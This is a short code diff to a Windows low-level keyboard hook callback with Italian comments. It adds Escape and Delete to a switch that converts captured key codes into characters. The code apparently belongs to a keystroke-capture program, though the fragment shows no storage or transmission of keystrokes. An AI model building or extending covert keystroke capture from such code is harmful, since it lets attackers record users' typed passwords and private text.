@@ -25,12 +25,14 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                 key = (char)vkCode;
             }
             else {
-                // Mappiamo qualche tasto speciale base per esempio
+                // Mapping di caratteri speciali
                 switch (vkCode) {
                 case VK_SPACE: key = ' '; break;
                 case VK_RETURN: key = '\n'; break;
                 case VK_BACK: key = '\b'; break;
                 case VK_TAB: key = '\t'; break;
+                case VK_ESCAPE: key = 27; break;
+                case VK_DELETE: key = 127; break;
                 default:
                     // Ignora altri tasti per semplicità
                     key = 0;
